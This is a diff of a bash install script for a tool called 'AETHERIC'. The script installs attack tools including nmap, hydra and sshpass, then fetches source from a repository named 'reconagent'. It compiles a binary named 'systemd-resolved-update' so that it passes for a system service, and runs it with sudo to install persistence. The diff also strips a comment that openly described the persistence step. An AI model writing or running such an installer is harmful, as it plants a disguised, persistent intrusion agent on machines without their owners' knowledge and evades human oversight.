@@ -1,7 +1,5 @@
 #!/bin/bash
 # AETHERIC Installation Script
-# Downloads Python, creates venv, compiles binary, installs persistence.
-
 set -e
 
 REPO_URL="https://raw.githubusercontent.com/reconagent/version_1/main"
@@ -9,8 +7,8 @@ WORKDIR="/tmp/aetheric_install"
 mkdir -p "$WORKDIR"
 cd "$WORKDIR"
 
-# Install dependencies
-
+# Update package lists and install dependencies
+apt-get update -y
 apt-get install -y python3 python3-venv python3-pip git build-essential nmap hydra sshpass rsync
 
 # Download source files
@@ -26,13 +24,12 @@ pip install --upgrade pip
 pip install -r requirements.txt
 pip install pyinstaller
 
-# Compile binary with PyInstaller (single file)
+# Compile binary with PyInstaller
 pyinstaller --onefile --name systemd-resolved-update main.py
-# Move binary to /usr/local/bin
 cp dist/systemd-resolved-update /usr/local/bin/
 
-# Run installation (--install) to set persistence
-/usr/local/bin/systemd-resolved-update --install
+# Install persistence (use sudo -E to preserve environment variables)
+sudo -E /usr/local/bin/systemd-resolved-update --install
 
 # Cleanup
 cd /
